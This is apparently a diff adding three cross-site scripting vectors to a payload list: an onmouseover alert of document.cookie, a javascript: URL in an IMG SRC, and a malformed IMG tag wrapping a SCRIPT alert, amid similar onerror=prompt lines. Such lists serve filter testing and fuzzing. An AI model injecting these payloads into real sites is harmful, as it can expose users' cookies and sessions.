@@ -9,6 +9,9 @@
 <image/src/onerror=prompt(8)>
 <img/src/onerror=prompt(8)>
 <image src/onerror=prompt(8)>
+<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
 <img src/onerror=prompt(8)>
 <image src =q onerror=prompt(8)>
 <img src =q onerror=prompt(8)>
